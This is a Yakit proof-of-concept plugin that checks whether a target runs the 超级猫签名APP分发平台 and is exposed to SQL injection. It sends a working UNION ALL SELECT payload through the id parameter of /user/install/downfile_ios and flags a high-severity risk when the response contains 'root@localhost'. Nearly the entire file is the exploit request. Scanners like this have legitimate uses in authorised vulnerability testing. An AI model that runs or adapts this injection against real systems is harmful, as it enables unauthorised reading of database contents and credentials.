yakit.AutoInitYakit()
loglevel("info")

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    packet = `GET /user/install/downfile_ios?id=') UNION ALL SELECT NULL,NULL,CONCAT(IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- - HTTP/1.1
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Host: {{params(target)}}
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close


`

    rsp,req,_ = poc.HTTP(packet,
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(8),
    )

    //dump(rsp)
    if str.MatchAllOfSubString(rsp, 'root@localhost'){
        yakit.Info("%v found 超级猫签名APP分发平台  sql注入漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("超级猫签名APP分发平台  sql注入漏洞"),
        risk.severity("high"),
        risk.titleVerbose("超级猫签名APP分发平台  sql注入漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
